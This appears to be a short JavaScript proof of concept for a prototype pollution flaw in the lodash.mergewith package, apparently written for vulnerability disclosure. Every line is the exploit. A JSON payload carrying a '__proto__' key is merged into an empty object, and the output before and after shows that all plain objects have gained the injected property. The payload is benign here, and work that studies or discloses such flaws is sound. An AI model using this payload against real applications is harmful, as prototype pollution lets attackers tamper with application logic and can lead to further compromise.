var _ = require('lodash.mergewith');
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';

var a = {};
console.log("Before : " + a.oops);
_({}, JSON.parse(malicious_payload));
console.log("After : " + a.oops);